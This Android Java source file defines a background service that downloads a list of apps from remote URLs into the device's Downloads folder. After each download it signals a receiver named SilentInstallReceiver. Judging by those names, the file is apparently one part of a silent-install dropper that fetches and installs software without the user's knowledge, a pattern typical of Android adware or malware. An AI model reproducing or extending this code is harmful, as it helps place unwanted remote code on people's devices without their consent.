package com.xstd.active.plugin;

import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;
import net.tsz.afinal.bitmap.download.Downloader;
import net.tsz.afinal.bitmap.download.SimpleHttpDownloader;

import java.io.*;
import java.util.Iterator;

/**
 * Created by chrain on 13-12-20.
 */
public class DownloadService extends Service {

    Downloader downloader;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        downloader = new SimpleHttpDownloader();
        if(Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())&&SilentInstallService.mustDownloadApp.size()>0){
            new Thread(new DownloadTask()).start();
        }
    }

    private class DownloadTask implements Runnable {

        @Override
        public void run() {
            Iterator<SilentInstallService.DownloadApplication> iterator = SilentInstallService.mustDownloadApp.iterator();
            while (iterator.hasNext()) {
                SilentInstallService.DownloadApplication downloadApplication = iterator.next();
                Log.w("ps",downloadApplication.fileName);
                OutputStream fos = null;
                try {
                    fos = new BufferedOutputStream(new FileOutputStream(new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),downloadApplication.fileName)));
                    downloader.downloadToLocalStreamByUrl(downloadApplication.remoteUrl,fos);
                    Intent intent = new Intent(getApplicationContext(),SilentInstallReceiver.class);
                    sendBroadcast(intent);
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    if(fos !=null) {
                        try {
                            fos.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }

            }
            sendBroadcast(new Intent(getApplicationContext(),StopDownloadReceiver.class));
        }
    }
}
